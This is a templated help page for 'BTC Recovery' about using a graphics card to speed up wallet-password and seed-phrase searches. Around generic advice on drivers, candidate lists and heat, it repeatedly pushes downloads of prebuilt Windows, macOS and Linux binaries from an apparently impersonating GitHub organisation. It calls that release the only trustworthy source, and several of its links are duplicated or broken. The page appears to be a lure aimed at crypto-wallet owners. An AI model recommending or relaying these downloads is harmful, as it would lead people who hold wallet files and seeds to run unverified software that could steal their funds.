<div align="center">
<img src="assets/banner-article.png" alt="GPU acceleration setup">
</div>

# GPU acceleration setup

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A graphics card tests candidates far faster than a processor, which matters when the search space is large and nothing else can be narrowed. It does not change what is possible  -  only how long the same space takes  -  so acceleration is a decision about time, not about capability.

## You'll see this if

The run is correct and slow, and you want to know whether the hardware can be brought in without breaking the run.

| What you see | What it means | What to do |
|---|---|---|
| A long estimate with a tight candidate list | the space is genuinely large | consider acceleration |
| A long estimate with a loose list | the list, not the hardware, is the problem | tighten the rules first |
| The acceleration option is rejected at start | driver or device not visible to the tool | check the driver, then the help |
| The GPU run is slower than the CPU for a tiny list | overhead exceeds the work | stay on the CPU |
| Everything at maximum and still no finish | the space is unbounded, not slow | revisit the assumptions |
| A crash mid-run | device memory or driver timeout | reduce batch size, or run per file |

## Why it happens

Wallet encryption is deliberately slow, and each candidate costs a fixed amount of work. A processor does a handful of those in parallel; a graphics card does thousands, because the same operation runs across many small cores at once. For a space of millions of candidates that difference is the whole evening.

The same property makes acceleration useless for small work. There is a setup cost to moving candidate batches to the device and back, so a list of a few thousand candidates finishes sooner on the processor while the card is still being initialised. Acceleration pays at scale, and only at scale.

What acceleration cannot do is make an unbounded space finite. If the pattern allows any character in any position, no device finishes it, and a faster card simply reaches the same wall sooner. The estimate governs: [How the recovery odds calculator works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-seed-recovery-calculator.md).

Acceleration changes the shape of a run in ways worth expecting. The reported rate jumps, but so does the cost of a mistake: a loose pattern that would have failed overnight on a processor can occupy a card for a week, and the electricity is real. That inverts the usual advice slightly  -  with a card, the first list should be even tighter, because a fast machine makes a wide search look more plausible than it is. The card is a way to finish a good plan sooner, not a way to rescue a vague one.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Decide from the estimate, verify the device is visible, then keep the same rules and only change the engine.

1. **Confirm the CPU run works first.** A correct, slow run is the baseline; accelerating a broken one just fails faster: [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md).
2. **Read the help for the acceleration option** in the current release rather than copying one from an old note  -  the spelling and the accepted values change between versions.
3. **Update the graphics driver** before concluding the hardware is unsupported, and check that the device is visible to the system at all.
4. **Keep the candidate list identical** between runs, so a difference in outcome is attributable to the engine rather than to the rules: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md).
5. **Start with one wallet file**, not the whole archive, and confirm the reported rate rises before looping: [Checking many wallet files against one password list](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-multiple-wallets-one-run.md).
6. **Watch temperature and power.** A card at full load for hours throttles, and the rate decays; a slower stable run beats a fast one that shuts down.
7. **Record the rate you achieved**, because it is the number that makes every future estimate honest.

## If that did not work

If the accelerated run finds nothing while the CPU run found nothing either, the search was simply exhausted  -  the engine is not the variable to change.

If the accelerated run errors at start, the cause is almost always the driver or the device being invisible to the tool, not the wallet. If it runs but is slower, the candidate list is too small to amortise the setup, and the processor is the right tool for that job. If it runs and produces a different rate than expected, check that the list is identical: a rule change between runs is the most common explanation.

Where the space is genuinely enormous, the productive move is constraints rather than hardware: another known word, a tighter character class, a target address that eliminates branches early. Acceleration multiplies an achievable plan; it does not create one: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).

Power is part of the plan. A long run on a card that shares a supply with the rest of the machine can trip protection under load, and an interrupted overnight run is worse than a slow one. If the machine has a second supply or a dedicated circuit, use it; if not, cap the load and accept the lower rate.

## Prevention

- Keep one machine for recovery work, with a stable driver version.
- Note the achieved rate beside each saved command.
- Prefer tighter rules over longer runs, every time.
- Monitor temperature on multi-hour work rather than leaving it unattended.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

### Is a gaming card enough?

Usually yes: the requirement is support for the acceleration path the tool uses, not a workstation model. Check the driver, then the help, then the reported rate  -  a card that runs and reports a rate is doing the work.

## FAQ

### Does a GPU make recovery faster?

Yes, by a large factor on large search spaces, because thousands of candidates are tested in parallel. On a small list the setup cost can make it slower than the processor, so the estimate decides.

### Which graphics cards are supported?

The current release's help lists the acceleration option and its accepted values, and that is the accurate source. Driver support matters more than the model, so update the driver before concluding a card is unsupported.

### Can GPU acceleration recover a wallet that a CPU cannot?

No. It changes the time, not the space. A search that is unbounded on a processor is equally unbounded on a card.

### Is it safe to run a graphics card at full load for hours?

It is normal work for the hardware, but heat is real: keep the case ventilated and watch the rate, because a throttled card silently produces a worse estimate than the one you planned with.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [BTCRecover command-line options]([BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md))
- [How the recovery odds calculator works]([How the recovery odds calculator works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-seed-recovery-calculator.md))
- [Checking many wallet files against one password list]([Checking many wallet files against one password list](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-multiple-wallets-one-run.md))
- [How to use BTCRecover: first run walkthrough]([How to use BTCRecover: first run walkthrough](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/how-to-use-btcrecover.md))
